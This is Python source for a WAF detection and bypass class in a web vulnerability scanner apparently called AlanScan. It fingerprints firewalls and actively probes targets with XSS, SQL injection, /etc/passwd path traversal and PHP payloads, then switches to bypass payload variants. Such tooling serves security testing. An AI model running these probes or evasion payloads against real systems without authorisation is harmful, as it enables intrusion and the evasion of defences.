class WAFDetector:
    """
    Enhanced WAF detection and bypass engine.
    """

    def __init__(self, url, timeout=10, proxy=None, threads=10):
        self.url = url
        self.timeout = timeout
        self.session = make_session(proxy, timeout)
        self.waf_detected = None
        self.waf_details = {}
        self.findings = []

    def detect(self) -> list[dict]:
        """Run enhanced WAF detection."""
        findings = []

        # Passive detection
        try:
            resp = self.session.get(self.url, timeout=self.timeout,
                                    allow_redirects=True)
            waf = self._fingerprint_response(resp)
            if waf:
                self.waf_detected = waf
                self.waf_details["method"] = "passive"
        except Exception:
            pass

        # Active probe if not detected
        if not self.waf_detected:
            waf = self._active_probe()
            if waf:
                self.waf_detected = waf
                self.waf_details["method"] = "active"

        if self.waf_detected:
            logger.info("  [INFO] WAF Detected: %s", self.waf_detected)
            logger.info("  [*] Switching to WAF bypass payloads")
            findings.append({
                "type": "WAF Detected",
                "url": self.url,
                "parameter": "HTTP headers / response",
                "payload": "WAF probe",
                "severity": "INFO",
                "evidence": (
                    f"WAF identified: {self.waf_detected} (detected via {self.waf_details.get('method', 'unknown')}). "
                    f"AlanScan has automatically switched to WAF bypass payload variants. "
                    f"Bypass techniques include: case mutation, comment insertion, double URL encoding, "
                    f"null bytes, unicode escapes, and protocol-level evasion."
                ),
                "details": {
                    "waf_vendor": self.waf_detected,
                    "detection_method": self.waf_details.get("method", "unknown"),
                    "bypass_categories": sorted(list(WAF_BYPASS_PAYLOADS.keys())),
                }
            })
        else:
            logger.info("  [OK] No WAF detected")
            findings.append({
                "type": "WAF Status — No WAF Detected",
                "url": self.url,
                "parameter": "HTTP response analysis",
                "payload": "N/A",
                "severity": "INFO",
                "evidence": "No WAF fingerprint found in headers, cookies, or response body.",
            })

        return findings

    def get_bypass_payloads(self, category: str) -> list[str]:
        """Return bypass payloads for category."""
        if self.waf_detected:
            return WAF_BYPASS_PAYLOADS.get(category, [])
        return []

    def _fingerprint_response(self, resp) -> str | None:
        """Enhanced fingerprinting with multiple signals."""
        headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body_lower = resp.text.lower()[:10000]
        cookies_lower = [c.lower() for c in resp.cookies.keys()]
        server = headers_lower.get("server", "")

        for waf_name, sigs in WAF_SIGNATURES.items():
            # Headers
            for h in sigs["headers"]:
                if h.lower() in headers_lower:
                    return waf_name
            # Cookies
            for c in sigs["cookies"]:
                if any(c.lower() in ck for ck in cookies_lower):
                    return waf_name
            # Body
            for b in sigs["body"]:
                if b.lower() in body_lower:
                    return waf_name
            # Server header
            for s in sigs["server"]:
                if s.lower() in server:
                    return waf_name

        return None

    def _active_probe(self) -> str | None:
        """Enhanced active probe with multiple test payloads."""
        test_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
            "<?php echo 'test'; ?>",
        ]

        try:
            baseline = self.session.get(self.url, timeout=self.timeout)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            return None

        for payload in test_payloads:
            probe_url = f"{self.url}?probe={payload}"
            try:
                probed = self.session.get(probe_url, timeout=self.timeout,
                                         allow_redirects=False)

                # Block detection
                if probed.status_code in (403, 406, 429, 503):
                    waf = self._fingerprint_response(probed)
                    return waf or "Unknown WAF"

                # Response length significantly different
                if probed.status_code == 200 and baseline_status == 200:
                    if abs(len(probed.text) - baseline_len) > 1000:
                        waf = self._fingerprint_response(probed)
                        return waf or "Unknown WAF"

                # Redirect to block page
                if probed.status_code in (301, 302) and "block" in probed.headers.get("Location", "").lower():
                    return "Unknown WAF (redirect to block page)"

            except Exception:
                continue

        return None